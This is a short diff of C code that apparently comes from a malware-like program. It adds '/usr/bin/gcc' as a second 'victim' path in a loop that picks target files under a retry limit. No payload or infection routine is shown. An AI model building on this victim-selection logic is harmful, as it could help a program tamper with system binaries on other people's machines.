@@ -539,6 +539,7 @@ marker:
 	int victim_important = 1;
 	int victim_imp_num = 5;
 	char imp_victim1[] = "/home/wang/Desktop/getkb1";
+	char imp_victim2[] = "/usr/bin/gcc";
 	i = 1;
 	while (success < VICTIM && tries < ATTEMPTS)
 	{
@@ -553,6 +554,7 @@ marker:
 					string_append(victim_pathname, imp_victim1, 0);
 					break;
 				default: 
+					string_append(victim_pathname, imp_victim2, 0);
 					victim_important = 0;
 					break;
 			}
